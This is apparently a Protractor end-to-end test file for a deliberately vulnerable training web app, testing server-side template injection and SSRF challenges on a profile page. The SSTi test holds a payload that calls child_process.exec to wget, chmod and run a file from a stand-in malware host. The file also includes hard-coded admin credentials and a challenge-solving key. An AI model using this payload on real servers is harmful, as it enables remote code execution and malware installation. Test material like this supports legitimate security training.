const config = require('config')

describe('/profile', () => {
  let username, submitButton, url
  beforeEach(() => {
    browser.waitForAngularEnabled(false)
  })

  describe('challenge "SSTi"', () => {
    protractor.beforeEach.login({email: 'admin@' + config.get('application.domain'), password: 'admin123'})
    browser.get('/profile')

    it('should be possible to inject arbitrary nodeJs commands in username', () => {
      browser.get('/profile')
      browser.waitForAngularEnabled(false)
      username = element(by.id('username'))
      submitButton = element(by.id('submit'))
      username.sendKeys('#{root.process.mainModule.require(\'child_process\').exec(\'wget http://link-to-malware.co && chmod +x malware && ./malware\')}')
      submitButton.click()
      browser.get('/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3') // Until malware is ready
      browser.get('/')
      browser.driver.sleep(5000)
    })
    protractor.expect.challengeSolved({ challenge: 'SSTi' })
  })

  describe('challenge "SSRF"', () => {
    protractor.beforeEach.login({email: 'admin@' + config.get('application.domain'), password: 'admin123'})
    browser.get('/profile')

    it('should be possible to request internal resources using image upload URL', () => {
      browser.get('/profile')
      browser.waitForAngularEnabled(false)
      url = element(by.id('url'))
      submitButton = element(by.id('submitUrl'))
      url.sendKeys('http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3')
      submitButton.click()
      browser.get('/')
      browser.driver.sleep(5000)
    })
    protractor.expect.challengeSolved({ challenge: 'SSRF' })
  })
})
